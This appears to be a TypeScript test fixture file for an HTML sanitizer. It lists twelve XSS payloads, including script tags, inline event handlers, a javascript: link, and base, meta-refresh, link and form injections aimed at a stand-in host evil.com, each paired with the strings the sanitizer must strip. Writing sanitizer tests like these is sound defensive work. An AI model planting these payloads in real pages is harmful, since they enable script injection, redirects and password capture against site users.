export interface XssHtmlFixture {
  id: string
  html: string
  forbidden: string[]
}

export const XSS_HTML_FIXTURES: XssHtmlFixture[] = [
  {
    id: 'script-tag',
    html: '<p>OK</p><script>alert("xss")</script>',
    forbidden: ['<script', 'alert("xss")'],
  },
  {
    id: 'onclick-handler',
    html: '<p onclick="alert(1)">Clique</p>',
    forbidden: ['onclick', 'alert(1)'],
  },
  {
    id: 'javascript-href',
    html: '<a href="javascript:alert(1)">malicioso</a>',
    forbidden: ['javascript:'],
  },
  {
    id: 'onerror-img',
    html: '<img src="x" onerror="alert(1)" alt="x">',
    forbidden: ['onerror'],
  },
  {
    id: 'base-tag-injection',
    html: '<base href="https://evil.com"><p>Texto</p>',
    forbidden: ['<base', 'evil.com'],
  },
  {
    id: 'object-embed',
    html: '<object data="evil.swf"></object><p>Seguro</p>',
    forbidden: ['<object', 'evil.swf'],
  },
  {
    id: 'data-attribute-handler',
    html: '<p data-onclick="alert(1)">X</p>',
    forbidden: ['data-onclick'],
  },
  {
    id: 'meta-refresh',
    html: '<meta http-equiv="refresh" content="0;url=https://evil.com"><p>Conteúdo</p>',
    forbidden: ['<meta', 'evil.com'],
  },
  {
    id: 'link-stylesheet',
    html: '<link rel="stylesheet" href="https://evil.com/x.css"><p>Texto</p>',
    forbidden: ['<link', 'evil.com'],
  },
  {
    id: 'noscript',
    html: '<noscript><p>NS</p></noscript><p>Visível</p>',
    forbidden: ['<noscript'],
  },
  {
    id: 'form-injection',
    html: '<form action="https://evil.com"><input name="pw"></form>',
    forbidden: ['<form', '<input'],
  },
  {
    id: 'svg-onload',
    html: '<svg onload="alert(1)"></svg><p>Texto</p>',
    forbidden: ['<svg', 'onload'],
  },
]
